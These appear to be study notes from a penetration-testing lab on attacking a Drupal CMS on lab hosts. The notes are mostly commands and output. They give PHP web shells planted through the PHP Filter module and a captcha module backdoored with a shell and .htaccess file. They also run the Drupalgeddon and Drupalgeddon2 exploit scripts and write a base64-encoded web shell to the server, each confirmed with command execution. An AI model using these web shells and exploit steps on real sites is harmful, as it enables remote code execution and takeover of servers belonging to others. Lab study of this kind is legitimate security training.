## Leveraging the PHP Filter Module

```url
http://drupal-qa.inlanefreight.local/#overlay=admin/modules
```
![](Pasted%20image%2020260729120540.png)

```url
http://drupal-qa.inlanefreight.local/#overlay=node/add
```
![](Pasted%20image%2020260729120612.png)

The `MD5` hash representation can originate from any hashed command or string that isn't easily guessable and is not present in any dictionary wordlists used for directory brute-forcing.

```php
<?php 
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']); 
?>
```

```url
http://drupal-qa.inlanefreight.local/#overlay=node/add/page
```
![](Pasted%20image%2020260729120658.png)

```shell
3kjS@htb[/htb]$ curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">" 

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```shell
3kjS@htb[/htb]$ wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
```

```url
http://drupal.inlanefreight.local/admin/reports/updates/install
```
![](Pasted%20image%2020260729120745.png)
## Uploading a Backdoored Module

```shell
3kjS@htb[/htb]$ wget --no-check-certificate https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz 

3kjS@htb[/htb]$ tar xvf captcha-8.x-1.2.tar.gz
```

```php
<?php 
system($_GET['fe8edbabc5c5c9b7b764504cd22b17af']); 
?>
```

Next, we need to create a .htaccess file to give ourselves access to the folder. This is necessary as Drupal denies direct access to the /modules folder.

```html
<IfModule mod_rewrite.c> 
RewriteEngine On 
RewriteBase / 
</IfModule>
```

```shell
3kjS@htb[/htb]$ mv shell.php .htaccess captcha 
3kjS@htb[/htb]$ tar cvf captcha.tar.gz 

captcha/ 
captcha/ 
captcha/.travis.yml 
captcha/README.md 
captcha/captcha.api.php 
captcha/captcha.inc 
captcha/captcha.info.yml 
captcha/captcha.install 
<SNIP>
```

```url
http://drupal.inlanefreight.local/core/authorize.php
```
![](Pasted%20image%2020260729121030.png)

Once the installation succeeds, browse to `/modules/captcha/shell.php` to execute commands.

```shell
3kjS@htb[/htb]$ curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id 

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
## Leveraging Known Vulnerabilities

Over the years, Drupal core has suffered from a few serious remote code execution vulnerabilities, each dubbed `Drupalgeddon`. At the time of writing, there are 3 Drupalgeddon vulnerabilities in existence.

- [CVE-2014-3704](https://www.drupal.org/SA-CORE-2014-005), known as Drupalgeddon, affects versions 7.0 up to 7.31 and was fixed in version 7.32. This was a pre-authenticated SQL injection flaw that could be used to upload a malicious form or create a new admin user.
- [CVE-2018-7600](https://www.drupal.org/sa-core-2018-002), also known as Drupalgeddon2, is a remote code execution vulnerability, which affects versions of Drupal prior to 7.58 and 8.5.1. The vulnerability occurs due to insufficient input sanitization during user registration, allowing system-level commands to be maliciously injected.
- [CVE-2018-7602](https://cvedetails.com/cve/CVE-2018-7602/), also known as Drupalgeddon3, is a remote code execution vulnerability that affects multiple versions of Drupal 7.x and 8.x. This flaw exploits improper validation in the Form API.
## Drupalgeddon

```shell
3kjS@htb[/htb]$ python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd
```
![](Screenshot%202026-07-29%20at%2012.11.57.png)

```url
http://drupal-qa.inlanefreight.local/user#overlay=admin/people
```
![](Pasted%20image%2020260729121215.png)
## Drupalgeddon2

```shell
3kjS@htb[/htb]$ curl -s http://drupal-dev.inlanefreight.local/hello.txt 

;-)
```

```php
<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>
```

```shell
3kjS@htb[/htb]$ echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64 

PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K
```

Next, let's replace the `echo` command in the exploit script with a command to write out our malicious PHP script.

```shell
echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee mrb3n.php
```

```shell
3kjS@htb[/htb]$ python3 drupalgeddon2.py
```
![](Screenshot%202026-07-29%20at%2012.13.50.png)

```shell
3kjS@htb[/htb]$ curl http://drupal-dev.inlanefreight.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
## Drupalgeddon3
![](Pasted%20image%2020260729121415.png)
![](Screenshot%202026-07-29%20at%2012.14.29.png)
![](Screenshot%202026-07-29%20at%2012.14.41.png)
